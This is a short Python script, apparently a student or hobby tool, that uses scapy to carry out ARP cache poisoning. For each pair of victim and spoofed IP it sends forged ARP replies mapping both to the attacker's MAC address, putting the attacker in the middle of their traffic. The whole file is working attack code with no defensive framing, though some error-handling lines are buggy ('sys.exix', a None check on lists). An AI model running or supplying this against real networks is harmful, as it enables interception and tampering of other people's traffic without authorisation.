from scapy.all import *
import util

# input :
# - array of victim ips as array of str
# - array of ips to spoof in victim arp tables  as aray of str
# - network interface as str
# output:
# - send packet for each victim ip on network for spoofing arp tabels by replacing each spoof MAC witj attacker MAC
# - send packet for each spoffed ip on network for replacing victim MAC to attacker MAC
def arpPoisoning(victimIP, spoofIP, networkInterface):
        #get MAC adresses of given IPs
        attackerMAC = get_if_hwaddr(networkInterface)
        victimMAC =[util.getMAC(ip, networkInterface) for ip in victimIP ]
        spoofMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP ]

        #check if such IP adresses exist on network with given interface
        if spoofMAC==None or attackerMAC == None or victimMAC == None :
            print("Error occure! Attcker Mac : " +attackerMAC +"Victim Mac: " +victimMAC + "spoofing MAC :" +spoofMAC)
            sys.exix()

        # create Eher/ARP() packets for each victim IP
        # whcih will update arp tabels with spoof IP and correspoding to them attacker MAC
        # for each spoof IP create Ether/ARP() packet
        # which will update  arp tables with victim IP and map to each ip attackerMAC
        for i in range(0,len(victimIP)):
            for j in range(0,len(spoofIP)):
                if victimIP[i]!= spoofIP[j]:
                    pktV = Ether() / ARP()
                    pktV[Ether].src = attackerMAC
                    pktV[ARP].hwsrc = attackerMAC
                    pktV[ARP].psrc = spoofIP[j]
                    pktV[ARP].hwdst = victimMAC[i]
                    pktV[ARP].pdst = victimIP[i]

                    sendp(pktV, iface=networkInterface, verbose = 0)

                    pktS = Ether() / ARP()
                    pktS[Ether].src = attackerMAC
                    pktS[ARP].hwsrc = attackerMAC
                    pktS[ARP].psrc = victimIP[i]
                    pktS[ARP].hwdst = spoofMAC[j]
                    pktS[ARP].pdst = spoofIP[j]

                    sendp(pktS, iface=networkInterface, verbose = 0)
